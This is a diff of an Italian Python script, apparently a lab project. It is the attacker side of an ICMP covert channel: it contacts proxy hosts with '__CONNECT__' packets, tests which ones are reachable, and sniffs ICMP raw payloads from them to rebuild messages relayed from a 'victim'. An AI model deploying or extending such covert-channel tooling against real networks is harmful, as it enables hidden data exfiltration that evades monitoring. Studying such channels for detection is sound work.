@@ -1,12 +1,14 @@
 #L'attaccante riceve i messaggi da determinati indirizzi
 #Ricevuti tutti, li unisce in un unico messaggio
-from scapy.all import * #ICMP, IP, Raw, sniff
+from scapy.all import IP, ICMP,Raw, sniff
+from scapy.all import *
 import string
 import argparse
 import mymethods
 import threading
-import comunication_methods as conn  
+import comunication_methods as com  
 import re
+import sys
 
 def analizza_pacchetto(packet):#ex packet_callback 
     if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
@@ -33,13 +35,14 @@ def packet_callback(packet):
     print(packet.summary()) 
     #packet.show() 
 
+proxy_IP=[]
 sniff_args={
     "iface":"Ethernet 2", 
     "count":15,
     "filter":"icmp and (src host {ips})".format(ips="".join(
-        proxyIP[index] if index==0 
-        else " or "+proxyIP[index] 
-        for index in range(len(proxyIP))
+        proxy_IP[index] if index==0 
+        else " or "+proxy_IP[index] 
+        for index in range(len(proxy_IP))
     )),
     "prn":packet_callback,
     #"store":True,
@@ -115,91 +118,113 @@ def unisciDati(dati):
 def conn_to_Vittima(ip_vittima):
     print(f"Tentativo di connessione con {ip_vittima}...") 
     data="".join(
-        "__CONNECT__ "+proxyIP[index] if index==0 
-        else ", "+proxyIP[index] 
-        for index in range(len(proxyIP)
+        "__CONNECT__ "+proxy_IP[index] if index==0 
+        else ", "+proxy_IP[index] 
+        for index in range(len(proxy_IP)
     ))
-    conn.send_packet(data,ip_vittima) 
+    com.send_packet(data,ip_vittima) 
 
-def callback_test_connection(packet):
-    global timeout_timer
-    print("callback_test_connection")
+def callback_test_connection(packet): 
     print("Packet received: {}".format(packet.summary())) 
     if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
         if b'__CONNECT__' in bytes(packet[Raw].load): 
-            conn.pkt_received_event.set()
-            conn.timeout_timer.cancel()
-            conn.pkt_conn_arrived.set() 
+            print(f"{packet[IP].src} si vuole collegare") 
+            com.pkt_conn_received.set() 
         else:
             print(f"Il paccheto proviene da {packet[IP].src} ma non risponde alla connessione alla macchina") 
 
 def test_connection(ip_dst): 
-    global ip_vittima
-    if type(ip_dst) is not str or re.match(conn.ip_reg_pattern, ip_dst) is None:
+    print(f"test_connection: {proxy_IP}")
+    if type(ip_dst) is not str or re.match(com.ip_reg_pattern, ip_dst) is None:
         raise Exception("IP non valido") 
-    if type(ip_vittima) is not str or re.match(conn.ip_reg_pattern, ip_vittima) is None:
+    if type(ip_vittima) is not str or re.match(com.ip_reg_pattern, ip_vittima) is None:
         raise Exception("IP della vittima sconosciuto")
     
     print(f"Tentativo di connessione con {ip_dst}...")
     data="__CONNECT__ {}".format(ip_vittima)
-    if conn.send_packet(data,ip_dst):  
+    if com.send_packet(data,ip_dst):  
         try:
             args={
                 "filter":f"icmp and src {ip_dst}" 
                 #,"count":1 
-                ,"prn":conn.proxy_callback #this.callback_test_connection 
+                ,"prn":callback_test_connection #com.proxy_callback
                 #,"store":True 
                 ,"iface":mymethods.iface_from_IP(ip_dst)[1]
             }
-            conn.sniff_packet(args) 
-            conn.pkt_conn_arrived.wait()
-            if conn.sniffer.running: 
-                conn.sniffer.stop()
-                conn.sniffer.join()
-            return True
+            com.sniff_packet(args) 
+            com.pkt_conn_received.wait()
+            if com.sniffer.running: 
+                com.sniffer.stop()
+                com.sniffer.join()
+            if com.timeout_timer.is_alive():
+                com.timeout_timer.cancel()
+                print(f"La connessione con {ip_dst} è stabilita")
+                return True
         except Exception as e:
-            print(f"test_connection: {e}")
+            print(f"Eccezione: {e}")
             return False
+    print(f"La connessione con {ip_dst} è fallita")
     return False
 
-def global_variables():
-    global parser, proxyIP, sniffed_data
+def get_value_of_parser(args):
+    if args is None: 
+        raise Exception("Nessun argomento passato")
+    global ip_vittima, gateway_vittima
+    ip_vittima=args.ip_vittima
+    gateway_vittima=mymethods.calc_gateway(ip_vittima)
 
-    
+def check_value_in_parser(args):
+    if type(args) is not argparse.Namespace or args is None:
+        print("Nessun argomento passato") 
+        return False
+    if type(args.ip_vittima) is not str or re.match(com.ip_reg_pattern, args.ip_vittima) is None:
+        print("Devi specificare l'IP della vittima con --ip_vittima")
+        mymethods.supported_arguments(parser)
+        return False
+    return True
 
-    proxyIP = [
-        "192.168.56.101"
-        ,"192.168.56.103"
-        #,"192.168.56.1"
-        #,"192.168.56.xxx"
-    ]  
-    sniffed_data=[] 
-
-def get_args_parser():
+def get_args_from_parser():
     global parser
     parser = argparse.ArgumentParser()
     parser.add_argument("--ip_vittima",type=str, help="IP della vittima")
     #parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")
     return mymethods.check_args(parser)
 
-if __name__ == "__main__": 
-    #1) l'attaccante si connettte prima con la vittima 
-    args=get_args_parser()
-    if type(args.ip_vittima) is not str or re.match(conn.ip_reg_pattern, args.ip_vittima) is None:
-        print("Devi specificare l'IP della vittima con --ip_vittima")
-        mymethods.supported_arguments(parser)
-        exit(1) 
-    ip_vittima=args.ip_vittima
-    try: 
-        proxyIP=[proxy for proxy in proxyIP if test_connection(proxy)]
-        if len(proxyIP)<1:
-            print("Nessun proxy presente. Prova a usare questa macchina")
+def def_global_variables():
+    global proxy_IP  
+    proxy_IP = [
+        "192.168.56.101"
+        ,"192.168.56.103" 
+        #,"192.168.56.1"
+        #,"192.168.56.xxx"
+    ] 
+    global sniffed_data
+    sniffed_data=[] 
+
+if __name__ == "__main__":
+    try:
+        def_global_variables()
+        args=get_args_from_parser()
+        if not check_value_in_parser(args): 
             exit(0) 
+        get_value_of_parser(args)
+    except Exception as e: 
+        print(f"Eccezione: {e}")
+        exit(1)  
+    #1) Si controlla di poter comunicare
+    try: 
+        proxy_IP=[proxy for proxy in proxy_IP if test_connection(proxy)] 
+        if len(proxy_IP)<1:
+            print("Nessun proxy presente. Prova a indicare un'altra macchina")
+            sys.exit(0)
+            exit(0) 
+        print(f"I proxy raggiungibili sono: {proxy_IP}")
     except Exception as e:
         print(f"Eccezione: {e}") 
         exit(1)
-    exit(0)
-    #2) l'attaccante riceve i messaggi da determinati indirizzi
+    #2) si aspetta che i proxy possanno raggiugnere la vittima
+
+    #3) l'attaccante riceve i messaggi da determinati indirizzi
     print("Inizio Sniffing...") 
     data=ricevi_Messaggi(sniff_args)
     print("Sniffing terminato.") 
